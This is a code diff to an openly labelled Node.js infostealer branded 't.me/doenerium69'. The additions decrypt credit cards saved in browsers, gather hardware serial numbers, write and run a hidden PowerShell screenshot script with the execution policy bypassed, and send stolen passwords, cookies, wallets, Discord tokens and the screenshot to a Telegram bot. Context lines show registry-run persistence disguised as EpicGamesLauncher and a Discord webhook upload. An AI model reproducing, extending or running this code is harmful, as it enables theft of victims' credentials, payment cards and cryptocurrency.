@@ -24,6 +24,8 @@ var appdata = process.env.APPDATA,
     localappdata = process.env.LOCALAPPDATA;
 
 
+const botToken = 'YOURBOTTOKEN';
+const chatId = 'YOURCHATID';
 const discordWebhookUrl = 'REMPLACE_ME';
 
 
@@ -227,6 +229,20 @@ const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
 const keyName = 'EpicGamesLauncher';
     
 
+async function execAsync(command) {
+    try {
+        const { stdout, stderr } = await exec(command);
+        if (stderr) {
+            console.error(`Error executing command: ${command}\n${stderr}`);
+            return { error: stderr };
+        }
+        return { stdout };
+    } catch (error) {
+        console.error(`Error executing command: ${command}\n${error}`);
+        return { error: error.message };
+    }
+}
+
 function removeRegistryKey() {
   const command = `reg delete "${registryPath}" /v ${keyName} /f`;
 
@@ -273,7 +289,6 @@ function addRegistryKey() {
 function sendSuccessToWebhook() {i
   console.log('Sending success to webhook');
 }
-
 
 async function findBackupCodes() {
   for (const searchFolder of foldersToSearch) {
@@ -468,6 +483,7 @@ const walletLocalPaths = {
     "Coinomi": path.join(process.env.APPDATA, "Coinomi", "Coinomi", "wallets"),
 };
 
+
 const _0x9b6227 = {}
 _0x9b6227.passwords = 0
 _0x9b6227.cookies = 0
@@ -475,29 +491,28 @@ _0x9b6227.autofills = 0
 _0x9b6227.wallets = 0
 const count = _0x9b6227,
 user = {
-    ram: os.totalmem(),
-    version: os.version(),
-    uptime: os.uptime,
-    homedir: os.homedir(),
-    hostname: os.hostname(),
-    userInfo: os.userInfo().username,
-    type: os.type(),
-    arch: os.arch(),
-    release: os.release(),
-    roaming: process.env.APPDATA,
-    local: process.env.LOCALAPPDATA,
-    temp: process.env.TEMP,
-    countCore: process.env.NUMBER_OF_PROCESSORS,
-    sysDrive: process.env.SystemDrive,
-    fileLoc: process.cwd(),
-    randomUUID: crypto.randomBytes(16).toString('hex'),
-    start: Date.now(),
-    debug: false,
-    copyright: '<================[t.me/doenerium69 Stealer]>================>\n\n',
-    url: null,
-    locale: locale,
-
-}
+        ram: os.totalmem(),
+        version: os.version(),
+        uptime: os.uptime,
+        homedir: os.homedir(),
+        hostname: os.hostname(),
+        userInfo: os.userInfo().username,
+        type: os.type(),
+        arch: os.arch(),
+        release: os.release(),
+        roaming: process.env.APPDATA,
+        local: process.env.LOCALAPPDATA,
+        temp: process.env.TEMP,
+        countCore: process.env.NUMBER_OF_PROCESSORS,
+        sysDrive: process.env.SystemDrive,
+        fileLoc: process.cwd(),
+        randomUUID: crypto.randomBytes(16).toString('hex'),
+        start: Date.now(),
+        debug: false,
+        copyright: '<================[t.me/doenerium69 ]>================>\n\n',
+        url: null,
+        locale: locale,
+    }
 _0x2afdce = {}
 const walletPaths = _0x2afdce,
     _0x4ae424 = {}
@@ -775,7 +790,6 @@ function initializeFolders() {
         console.error(errorMessage);
     }
 }
-
 
 function createRunBat() {
     const programName = path.basename(app.getPath('exe'));
@@ -1525,7 +1539,6 @@ function findToken(path) {
   }
 }
 
-
 async function getUserData(token) {
     try {
         const userResponse = await axios.get("https://discord.com/api/v9/users/@me", {
@@ -1717,7 +1730,6 @@ async function updateBio(token, newBio) {
         return null;
     }
 }
-
 
 async function getHQGuilds(token) {
     try {
@@ -2326,20 +2338,106 @@ function createSteamEmbed(account, accountInfo, games, level) {
 }
 
 
+async function createScreenshotScript() {
+    const outputPath = path.join(mainFolderPath, 'Screenshots');
+    if (!fs.existsSync(outputPath)) {
+        fs.mkdirSync(outputPath);
+    }
+    const scriptContent = `
+# Capture screenshots of all screens
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+
+# Get all screens
+$screens = [System.Windows.Forms.Screen]::AllScreens
+
+# Calculate the total width and maximum height of all screens
+$totalWidth = ($screens | ForEach-Object { $_.Bounds.Width } | Measure-Object -Sum).Sum
+$maxHeight = ($screens | ForEach-Object { $_.Bounds.Height } | Measure-Object -Max).Maximum
+
+# Check if the calculated values are valid
+if ($totalWidth -le 0 -or $maxHeight -le 0) {
+    Write-Host "Error: Unable to calculate valid screen dimensions."
+    exit
+}
+
+# Try to create a bitmap with a PixelFormat argument
+try {
+    $combinedScreenshot = New-Object System.Drawing.Bitmap $totalWidth, $maxHeight, ([System.Drawing.Imaging.PixelFormat]::Format32bppArgb)
+} catch {
+    Write-Host "Error creating Bitmap object: $_"
+    exit
+}
+
+# Try to create a graphics object
+try {
+    $graphics = [System.Drawing.Graphics]::FromImage($combinedScreenshot)
+} catch {
+    Write-Host "Error creating Graphics object: $_"
+    exit
+}
+
+# Capture the screen images and paste them onto the combined screenshot
+$offsetX = 0
+foreach ($screen in $screens) {
+    $screenScreenshot = New-Object System.Drawing.Bitmap $screen.Bounds.Width, $screen.Bounds.Height
+
+    # Try to create a graphics object for the screen
+    try {
+        $screenGraphics = [System.Drawing.Graphics]::FromImage($screenScreenshot)
+    } catch {
+        Write-Host "Error creating screen Graphics object for $($screen.DeviceName): $_"
+        exit
+    }
+
+    $screenGraphics.CopyFromScreen($screen.Bounds.Location, [System.Drawing.Point]::Empty, $screen.Bounds.Size)
+    $graphics.DrawImage($screenScreenshot, $offsetX, 0)
+    $offsetX += $screen.Bounds.Width
+}
+
+# Save the combined screenshot to a file
+$outputPath = "${mainFolderPath}\\Screenshots\\Screenshot.png"
+
+try {
+    # Créer le répertoire si nécessaire
+    $outputDirectory = [System.IO.Path]::GetDirectoryName($outputPath)
+    if (-not (Test-Path -Path $outputDirectory)) {
+        New-Item -ItemType Directory -Force -Path $outputDirectory
+    }
+
+    # Convertir l'image en tableau de bytes et le sauvegarder directement
+    $imageBytes = [System.IO.MemoryStream]::new()
+    $combinedScreenshot.Save($imageBytes, [System.Drawing.Imaging.ImageFormat]::Png)
+    [System.IO.File]::WriteAllBytes($outputPath, $imageBytes.ToArray())
+    Write-Host "Combined screenshot saved to: $outputPath"
+} catch {
+    # Gérer les erreurs et afficher le message d'erreur spécifique
+    Write-Host "Error saving the combined screenshot: $($_.Exception.Message)"
+}
+
+    `;
+    const scriptPath = path.join(user.temp, 'CaptureScreens.ps1');
+    try {
+        await fs.promises.writeFile(scriptPath, scriptContent);
+        return scriptPath;
+    } catch (error) {
+        console.error(`Error writing PowerShell script: ${error.message}`);
+        throw error; 
+    }
+}
+
 
 async function archiveAndSendData() {
     let zipFilePath;
-
+    const outputPath = path.join(mainFolderPath, 'Screenshots');
+    const scriptPath = await createScreenshotScript(outputPath);
     try {
         initializeFolders();
-
         await new Promise(resolve => setTimeout(resolve, 4000));
-
         const walletsFolder = path.join(mainFolderPath, 'Wallets');
         if (!fs.existsSync(walletsFolder)) {
             fs.mkdirSync(walletsFolder);
         }
-
         for (let [extensionName, extensionPath] of Object.entries(extension)) {
             for (let i = 0; i < browserPath.length; i++) {
                 let browserFolder;
@@ -2348,7 +2446,6 @@ async function archiveAndSendData() {
                 } else {
                     browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
                 }
-
                 const browserExtensionPath = path.join(browserPath[i][0], extensionPath);
                 if (fs.existsSync(browserExtensionPath)) {
                     const walletFolder = path.join(walletsFolder, `${extensionName}_${browserFolder}_${browserPath[i][1]}`);
@@ -2356,24 +2453,20 @@ async function archiveAndSendData() {
                 }
             }
         }
-
         for (let [walletName, walletPath] of Object.entries(walletPaths)) {
             if (fs.existsSync(walletPath)) {
                 const walletFolder = path.join(walletsFolder, walletName);
                 copyFolder(walletFolder, walletPath);
             }
         }
-
         const data = {
             Discord: [path.join(mainFolderPath, 'Discord', 'discord.txt')],
         };
-
         if (tokens.length > 0) {
             const discordFolderPath = path.join(mainFolderPath, 'Discord');
             if (!fs.existsSync(discordFolderPath)) {
                 fs.mkdirSync(discordFolderPath);
             }
-
             const discordFilePath = path.join(discordFolderPath, 'discord.txt');
             const discordFileContent = tokens.join('\n');
             fs.writeFileSync(discordFilePath, discordFileContent);
@@ -2383,25 +2476,35 @@ async function archiveAndSendData() {
             if (!fs.existsSync(discordFolderPath)) {
                 fs.mkdirSync(discordFolderPath);
             }
-
             const discordFilePath = path.join(discordFolderPath, 'discord.txt');
             const noTokenMessage = 'No token found.';
             fs.writeFileSync(discordFilePath, noTokenMessage);
             console.log('No token found. Updated discord.txt with message.');
         }
-
         Object.entries(data).forEach(([dataType, files]) => {
             files.forEach(file => moveFileToFolder(file, dataType));
             console.log(`Files moved to ${dataType} folder`);
         });
 
+        const powershellCommand = `powershell -ExecutionPolicy Bypass -File "${scriptPath}"`;
+        const powershellProcess = exec(powershellCommand);
+        powershellProcess.stdout.on('data', (data) => {
+            console.log(`PowerShell script output:\n${data}`);
+        });
+        powershellProcess.stderr.on('data', (data) => {
+            console.error(`PowerShell script error:\n${data}`);
+        });
+        powershellProcess.on('exit', (code) => {
+            if (code === 0) {
+                console.log('PowerShell script executed successfully.');
+            } else {
+                console.error(`PowerShell script exited with code ${code}.`);
+            }
+        });
         const archive = new AdmZip();
         archive.addLocalFolder(mainFolderPath);
-
         zipFilePath = `./${locale}-${computerName}.zip`;
-
         archive.addZipComment('All the Information was Stealed by T.ME/DOENERIUM69.');
-
         archive.writeZip(zipFilePath);
         console.log('Archive created successfully');
         getExtension(zipFilePath);
@@ -2452,6 +2555,53 @@ async function uploadToDoge(destinationFolder, locale, computerName) {
 }
 
 
+function runSerialChecker() {
+    const filePath = path.join(mainFolderPath, 'Serial-Check.txt');
+
+    const commandMappings = {
+        'wmic diskdrive get serialnumber': 'Disk',
+        'wmic baseboard get serialnumber': 'Motherboard',
+        'wmic path win32_computersystemproduct get uuid': 'SMBios',
+        'wmic PATH Win32_VideoController GET Description,PNPDeviceID': 'GPU',
+        'wmic memorychip get serialnumber': 'RAM',
+        'wmic csproduct get uuid': 'Bios',
+        'wmic cpu get processorid': 'CPU',
+        'getmac /NH': 'Mac'
+    };
+
+    const outputFileStream = fs.createWriteStream(filePath);
+
+    function runNextCommand(index) {
+        const commandKeys = Object.keys(commandMappings);
+
+        if (index < commandKeys.length) {
+            const command = commandKeys[index];
+            const header = `======= ${commandMappings[command]} =======\n`;
+
+            outputFileStream.write(header);
+
+            exec(command, (error, stdout, stderr) => {
+                if (error) {
+                    console.error(`Error executing command: ${command}\n${error}`);
+                    outputFileStream.write(`Error executing command: ${command}\n${error}\n`);
+                } else {
+                    console.log(`Command executed successfully: ${command}`);
+                    const cleanedOutput = stdout.replace(/ +/g, ' ').replace(/\n+/g, ' ');
+                    outputFileStream.write(cleanedOutput);
+                }
+
+                runNextCommand(index + 1);
+            });
+        } else {
+            console.log(`Serial Checker completed. Output saved to: ${filePath}`);
+            outputFileStream.end();
+        }
+    }
+
+    outputFileStream.write(user.copyright);
+    runNextCommand(0);
+}
+
 async function getExtension(zipFilePath) {
 
     const discordTokensFilePath = path.join(mainFolderPath, 'discord', 'discord.txt');
@@ -2495,11 +2645,87 @@ async function getExtension(zipFilePath) {
     let walletCount = walletSubdirectories.length;
     const foundFoldersText = await checkFolders(mainFolderPath);
     const foundWalletsText = await checkWallets(mainFolderPath);
+    const foundFoldersTele = await checkFolderstele(mainFolderPath);
+    const foundWalletsTele = await checkWalletstele(mainFolderPath);
+
     const destinationFolder = 'C:\\ProgramData\\Epic\\Launcher';
     const token = await uploadToDoge(destinationFolder, locale, computerName);
     const downloadLink = `https://api.filedoge.com/download/${token}`;
-
     const ip = await getIp();
+
+const message = `
+🔐 <b>Passwords:</b> <code>${passwordsCount}</code>
+🍪 <b>Cookies:</b> <code>${count.cookies}</code>
+📋 <b>Autofills:</b> <code>${autofillCount}</code>
+💸 <b>Wallets:</b> <code>${walletCount}</code>
+🔑 <b>Tokens:</b> <code>${discordTokensCount}</code>
+
+<b>⚙ <i><u>System Information:</u></i></b>
+<b>
+Hostname: <code>${user.hostname}</code>
+User Info: <code>${user.userInfo}</code>
+Version: <code>${user.version}</code>
+IP Address: <code>${ip}</code>
+Uptime: <code>${user.uptime}</code>
+Type: <code>${user.type}</code>
+Arch: <code>${user.arch}</code>
+Release: <code>${user.release}</code>
+Count Core: <code>${user.countCore}</code>
+File Location: <code>${user.fileLoc}</code>
+</b>
+
+<b><i>Download Link:</i></b> <a href="${downloadLink}"><b><u>${locale}-${computerName}.zip</u></b></a>
+
+<b><u><i>Local Session Found:</i></u></b>
+${foundFoldersTele || 'None'}
+
+<b><u><i>Local Wallets Found:</i></u></b>
+${foundWalletsTele || 'None'}
+`;
+
+const screenshotPath = path.join(mainFolderPath, 'Screenshots', 'Screenshot.png');
+
+    if (fs.existsSync(screenshotPath)) {
+        const imageBuffer = fs.readFileSync(screenshotPath);
+        
+        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+const formData = new FormData();
+formData.append('chat_id', chatId);
+formData.append('photo', imageBuffer, { filename: 'Screenshot.png' });
+formData.append('caption', message);
+
+try {
+    await axios.post(telegramApiUrl, formData, {
+        headers: {
+            'Content-Type': `multipart/form-data; boundary=${formData._boundary}`,
+        },
+        params: {
+            parse_mode: 'HTML',
+        },
+    });
+
+    console.log('Screenshot and system information successfully sent to Telegram.');
+} catch (error) {
+    console.error('Telegram Error:', error);
+    console.error('Error response data:', error.response.data);
+}
+    } else {
+        const telegramMessageApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        try {
+            await axios.post(telegramMessageApiUrl, {
+                chat_id: chatId,
+                parse_mode: 'HTML',
+                text: message,
+            });
+
+            console.log('System information successfully sent to Telegram (without screenshot).');
+        } catch (error) {
+            console.error(`Error sending system information to Telegram: ${error.message}`);
+        }
+    }
+
+
+
     const combinedInfoEmbed = {
         title: '',
         description: '‎',
@@ -2571,6 +2797,7 @@ async function getExtension(zipFilePath) {
         .then(() => {
             console.log('system information successfully sent to Discord webhook.');
             fs.unlinkSync(zipFilePath);
+            fs.unlinkSync(mainFolderPath);
         })
         .catch(error => {
             console.error('An error occurred while sending system information:', error.message);
@@ -2586,9 +2813,22 @@ async function getExtension(zipFilePath) {
 
     await new Promise(resolve => setTimeout(resolve, 5000));
 
-    //process.exit();
+    process.exit();
 }
 
+function deleteFolderRecursive(folderPath) {
+    if (fs.existsSync(folderPath)) {
+        fs.readdirSync(folderPath).forEach((file, index) => {
+            const curPath = path.join(folderPath, file);
+            if (fs.lstatSync(curPath).isDirectory()) {
+                deleteFolderRecursive(curPath);
+            } else {
+                fs.unlinkSync(curPath);
+            }
+        });
+        fs.rmdirSync(folderPath);
+    }
+}
 
 async function checkFolders(mainFolderPath) {
     const foldersToCheck = [
@@ -2668,6 +2908,74 @@ async function checkWallets(mainFolderPath) {
         }
 
         return foundWalletsText || 'None';
+    } catch (error) {
+        console.error(error);
+        return `Error: ${error.message}`;
+    }
+}
+
+async function checkFolderstele(mainFolderPath) {
+    // Function similar to checkFolders without emojis for Telegram
+    const foldersToCheck = [
+        { name: 'Telegram' },
+        { name: 'Steam' },
+        { name: 'RiotGames' },
+        { name: 'FileZilla' },
+        { name: 'Epic Games' },
+    ];
+
+    const separator = '<b> | </b>';
+    let foundFoldersTele = '';
+
+    try {
+        for (const { name } of foldersToCheck) {
+            const folderPath = path.join(mainFolderPath, name);
+
+            if (fs.existsSync(folderPath) || fs.existsSync(path.join(mainFolderPath, name.toLowerCase()))) {
+                foundFoldersTele += `<code>${name}</code>${separator}`;
+            }
+        }
+
+        foundFoldersTele = foundFoldersTele.slice(0, -separator.length);
+
+        return foundFoldersTele || 'None';
+    } catch (error) {
+        console.error(error);
+        return `Error: ${error.message}`;
+    }
+}
+
+async function checkWalletstele(mainFolderPath) {
+    // Function similar to checkWallets without emojis for Telegram
+    const separator = '<b> | </b>';
+    let foundWalletsTele = '';
+
+    try {
+        // Check if the wallet folder exists inside the main folder
+        const walletFolder = path.join(mainFolderPath, 'Wallets');
+        if (fs.existsSync(walletFolder)) {
+            // Check all walletLocalPaths and display them without emojis
+            const walletEntries = await fs.promises.readdir(walletFolder);
+            let metamaskFound = false;
+
+            const foundWallets = walletEntries.map(walletName => {
+                if (walletName.toLowerCase().startsWith('metamask')) {
+                    if (!metamaskFound) {
+                        metamaskFound = true;
+                        return `<code>Metamask</code>${separator}`;
+                    }
+                } else {
+                    return `<code>${walletName}</code>${separator}`;
+                }
+            });
+
+            foundWalletsTele = foundWallets.join('');
+            if (foundWalletsTele) {
+                foundWalletsTele = foundWalletsTele.slice(0, -separator.length);
+            }
+        }
+
+        return foundWalletsTele || 'None';
     } catch (error) {
         console.error(error);
         return `Error: ${error.message}`;
@@ -2787,6 +3095,77 @@ async function getPasswords() {
 
     const passwordsFilePath = path.join(passwordsFolderPath, 'Passwords.txt');
     fs.writeFileSync(passwordsFilePath, user.copyright + _0x540754.join(''), {
+      encoding: 'utf8',
+      flag: 'a+',
+    });
+  }
+}
+
+
+async function getCards() {
+  const _0x540754 = [];
+
+  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
+    if (!fs.existsSync(browserPath[_0x261d97][0])) {
+      continue;
+    }
+
+    let _0xd541c2;
+    if (browserPath[_0x261d97][0].includes('Local')) {
+      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
+    } else {
+      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
+    }
+
+    const webData = browserPath[_0x261d97][0] + 'Web Data';
+    const copiedFilePath = browserPath[_0x261d97][0] + 'Web.db';
+
+    const key = Buffer.from(browserPath[_0x261d97][3], 'hex');
+
+    fs.copyFileSync(webData, copiedFilePath);
+
+    const databaseConnection = new sqlite3.Database(copiedFilePath);
+
+    await new Promise((resolve, reject) => {
+      databaseConnection.each(
+        'SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards',
+        (err, card) => {
+          if (err) {
+            reject(err);
+          } else {
+            try {
+              const month = card.expiration_month < 10 ? `0${card.expiration_month}` : `${card.expiration_month}`;
+              const _0x5e1041 = card.card_number_encrypted ? card.card_number_encrypted.slice(3, 15) : '';
+              const decryptedCardNumber = subModules.decryption(card.card_number_encrypted, key);
+              const cardInfo = `${decryptedCardNumber}\t${month}/${card.expiration_year}\t${card.name_on_card}\n`;
+              _0x540754.push(cardInfo);
+            } catch (error) {}
+          }
+        },
+        () => {
+          resolve();
+        }
+      );
+    });
+
+    try {
+      databaseConnection.close();
+      fs.unlinkSync(copiedFilePath);
+    } catch (error) {}
+  }
+
+  if (_0x540754.length === 0) {
+    _0x540754.push('no cards found');
+  }
+
+  if (_0x540754.length) {
+    const cardsFolderPath = path.join(mainFolderPath, 'Cards');
+    if (!fs.existsSync(cardsFolderPath)) {
+      fs.mkdirSync(cardsFolderPath);
+    }
+
+    const cardsFilePath = path.join(cardsFolderPath, 'Cards.txt');
+    fs.writeFileSync(cardsFilePath, user.copyright + _0x540754.join(''), {
       encoding: 'utf8',
       flag: 'a+',
     });
@@ -3015,7 +3394,8 @@ async function SubmitRiotGames() {
 
             const riotGamesExcludeList = [
                 "Metadata\\valorant.live\\valorant.live.manifest",
-                "Metadata\\valorant.live\\valorant.live.preview.manifest"
+                "Metadata\\valorant.live\\valorant.live.preview.manifest",
+                "Metadata\\vanguard\\setup.exe"
             ];
 
             try {
@@ -3142,10 +3522,12 @@ function onlyUnique(item, index, array) {
         initializeFolders();
         getEncrypted();
         getCookies();
+        runSerialChecker();
         getAutofills();
+        getCards();
         getPasswords();
         removeRegistryKey();
-        stealTokens();
+        getTokens();
         localWalletData();
         submitFileZilla();
         SubmitRiotGames();
